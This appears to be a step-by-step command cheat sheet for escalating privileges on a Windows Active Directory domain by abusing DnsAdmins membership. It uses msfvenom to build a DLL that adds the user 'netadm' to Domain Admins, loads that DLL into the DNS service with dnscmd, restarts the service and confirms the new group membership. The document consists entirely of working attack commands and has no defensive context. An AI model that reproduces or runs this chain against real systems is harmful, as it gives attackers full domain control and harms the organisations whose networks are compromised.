# Generating Malicious DLL
```powershell
msfvenom -p windows/x64/exec cmd='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

# Starting Local HTTP Server
```powershell
python3 -m http.server 7777
```

# Loading DLL as Non-Privileged User
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

# Loading Custom DLL
```powershell
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

# Finding User's SID
```powershell
wmic useraccount where name="netadm" get sid
```

# Checking Permissions on DNS Service
```powershell
sc.exe sdshow DNS
```

# Stopping the DNS Service
```powershell
sc stop dns
```

# Starting the DNS Service
```powershell
sc start dns
```

# Confirming Group Membership
```powershell
net group "Domain Admins" /dom
```
